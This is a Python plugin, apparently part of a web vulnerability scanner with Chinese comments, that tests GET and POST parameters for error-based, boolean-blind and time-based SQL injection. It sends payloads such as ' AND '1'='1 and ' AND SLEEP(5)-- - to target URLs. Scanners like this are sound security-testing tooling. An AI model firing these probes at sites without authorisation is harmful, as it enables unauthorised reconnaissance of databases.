# plugins/sqli.py
from .base import ScannerPlugin
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils import response_similarity
import time

class SQLiPlugin(ScannerPlugin):
    name = "sqli"
    description = "SQL注入检测（布尔盲注+时间盲注+报错注入）"
    severity = "high"

    # 常见SQL错误特征
    SQL_ERRORS = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
        "Microsoft OLE DB", "ODBC Driver", "Unclosed quotation",
        "quoted string not properly terminated", "You have an error in your SQL syntax"
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.time_based = True  # 是否启用时间盲注

    def check_get(self, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if not query:
            return False, {}
        for param in query.keys():
            original_value = query[param][0]
            result = self._test_injection(url, param, original_value, method="GET")
            if result:
                return True, result
        return False, {}

    def check_post(self, url, params):
        if not params:
            return False, {}
        for param in params.keys():
            original_value = params[param]
            result = self._test_injection(url, param, original_value, method="POST", params=params)
            if result:
                return True, result
        return False, {}

    def _test_injection(self, url, param, original_value, method, params=None):
        """对单个参数测试SQL注入"""
        # 1. 报错注入测试
        error_payload = original_value + "'"
        resp = self._send_payload(url, param, error_payload, method, params)
        if resp and any(err in resp.text for err in self.SQL_ERRORS):
            return self._build_result(
                "error_based_sqli",
                f"参数 {param} 存在报错注入",
                {"param": param, "payload": error_payload, "evidence": resp.text[:200]}
            )

        # 2. 布尔盲注测试
        true_payload = original_value + "' AND '1'='1"
        false_payload = original_value + "' AND '1'='2"
        resp_true = self._send_payload(url, param, true_payload, method, params)
        resp_false = self._send_payload(url, param, false_payload, method, params)
        if resp_true and resp_false:
            # 计算相似度（取关键内容而非全部，避免动态内容干扰）
            true_content = self._get_meaningful_content(resp_true)
            false_content = self._get_meaningful_content(resp_false)
            sim = response_similarity(true_content, false_content)
            if sim < 0.95:  # 相似度低，说明注入影响了响应
                # 需要再次验证，避免误报
                resp_true2 = self._send_payload(url, param, true_payload, method, params)
                resp_false2 = self._send_payload(url, param, false_payload, method, params)
                if resp_true2 and resp_false2:
                    sim2 = response_similarity(
                        self._get_meaningful_content(resp_true2),
                        self._get_meaningful_content(resp_false2)
                    )
                    if sim2 < 0.95:
                        return self._build_result(
                            "boolean_based_sqli",
                            f"参数 {param} 存在布尔盲注",
                            {"param": param, "true_payload": true_payload, "false_payload": false_payload}
                        )

        # 3. 时间盲注测试（如果布尔不确定或可选）
        if self.time_based:
            time_payload = original_value + "' AND SLEEP(5)-- -"
            start = time.time()
            resp = self._send_payload(url, param, time_payload, method, params, timeout=15)
            elapsed = time.time() - start
            if resp and elapsed > 4.5:
                return self._build_result(
                    "time_based_sqli",
                    f"参数 {param} 存在时间盲注（延迟 {elapsed:.2f}s）",
                    {"param": param, "payload": time_payload, "elapsed": elapsed}
                )
        return None

    def _send_payload(self, url, param, payload, method="GET", params=None, timeout=10):
        """发送带有payload的请求"""
        if method == "GET":
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
            return self.safe_request("GET", test_url, timeout=timeout)
        else:
            # POST
            test_params = params.copy()
            test_params[param] = payload
            return self.safe_request("POST", url, data=test_params, timeout=timeout)

    def _get_meaningful_content(self, resp):
        """提取响应中用于比较的有意义部分，去除动态噪声"""
        # 简单方式：提取body文本，移除script/style等
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(resp.text, "lxml")
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(" ", strip=True)
        return text[:500]  # 限制长度